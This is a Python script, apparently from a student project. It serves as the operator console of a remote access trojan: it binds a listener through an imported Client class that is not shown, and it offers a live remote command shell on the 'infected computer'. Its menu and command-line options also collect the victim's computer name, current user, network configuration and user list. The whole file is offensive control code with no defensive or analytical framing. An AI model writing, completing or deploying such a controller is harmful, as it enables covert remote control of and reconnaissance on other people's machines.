from Class_Projet import Client
import argparse

client = Client()
parser = argparse.ArgumentParser()

parser.add_argument("-s", "--shell", action="store_true", help="<<Access directly to the remote shell>>")
parser.add_argument("-i", "--informations", choices=["menu", "computername", "network", "currentuser", "allusers"],
                    help="<<Directly get informations>>")
parser.add_argument("-b", "--buffsize", type=int, choices=[1024, 2048, 4096, 8192, 16384], default=4096,
                    help="<<Choose an optional buffsize (default = 4096),>>")

args = parser.parse_args()

client.start()
client.bind()

if args.shell:
    choix = "1"
elif args.informations:
    choix = "2"
else:
    choix = client.menu_principal()


client.send(choix)
if choix == "1":
    while True:
        client.receive()
        cmd = input()
        client.send(cmd)
        if cmd == "quit":
            client.quit()
        else:
            client.receive()

elif choix == "2":
    if args.informations == "computername":
        choix2 = "1"
    else:
        print("\nPress 1 to get the infected computer name")
        print("Press 2 to see who is the current user")
        print("Press 3 to get the network configuration")
        print("Press 4 to get the list of users")
        print("Press 0 to quit")
        choix2 = input()

    client.choice_information(choix2)
